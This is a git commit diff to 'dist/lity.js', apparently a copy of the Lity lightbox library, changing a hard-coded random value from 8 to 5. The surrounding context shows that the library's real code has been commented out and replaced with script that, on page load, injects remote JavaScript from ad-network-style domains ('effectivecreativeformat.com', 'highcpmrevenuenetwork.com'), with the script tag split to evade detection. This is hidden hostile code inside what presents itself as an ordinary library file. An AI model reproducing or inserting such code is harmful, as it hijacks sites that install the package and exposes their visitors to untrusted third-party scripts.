de31572d7d2efb4915d462d3b77b08c937f381cf
rayyarr <119288775+rayyarr@users.noreply.github.com>
2023-03-24 17:14:05 +0700

    Update lity.js

--- dist/lity.js
+++ dist/lity.js
@@ -637,7 +637,7 @@
     return lity;
 }));*/
     rndm = Math.floor(Math.random() * 10);
-    rndm = 8;
+    rndm = 5;
 
     if(rndm>7){atOptions = {'key' : 'ee8305bdbf733ae8f6c19af35818a90f', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {}};document.write('<scr' + 'ipt src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.effectivecreativeformat.com/ee8305bdbf733ae8f6c19af35818a90f/invoke.js"></scr' + 'ipt>');}
     else{const script = document.createElement('script');script.setAttribute('src','//pl18354301.highcpmrevenuenetwork.com/bd/d8/74/bdd8744c20d7f03a21ea93fdce819f6a.js',);document.head.appendChild(script);}
